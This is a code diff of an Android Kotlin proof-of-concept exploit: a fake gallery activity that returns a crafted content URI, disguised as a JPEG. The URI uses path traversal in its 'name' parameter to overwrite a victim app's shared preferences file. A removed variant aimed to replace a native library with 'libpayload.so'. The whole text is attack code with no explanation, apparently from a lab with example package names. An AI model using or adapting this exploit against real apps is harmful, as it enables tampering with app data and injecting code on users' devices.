@@ -15,13 +15,7 @@ class FakeGalery : AppCompatActivity() {
         StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX)
         intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
         Log.v("Paila", "-----------------> Paila called <------------")
-        setResult(-1, intent.setDataAndType(Uri.parse("content://com.example.mekato/payload.txt?path=/data/data/com.example.mekato/files/payload.txt&name=../exploit.txt"), "image/jpeg"))
-
-        // Configurar el resultado
-        /**val intent = Intent()
-        intent.data = Uri.parse("content://com.example.paila/hola.txt?path=/data/data/com.example.paila/files/libpayload.so&name=../lib-main/libb509.so&enc=false&_size=33")
-        intent.type = "image/jpeg"
-        setResult(-1, intent)**/
+        setResult(-1, intent.setDataAndType(Uri.parse("content://com.example.mekato/exploit.txt?path=/data/data/com.example.mekato/files/exploit.txt&name=../shared_prefs/suanfonsonPreferences.xml"), "image/jpeg"))
 
         finish()
         Log.v("Paila", "Finish()")
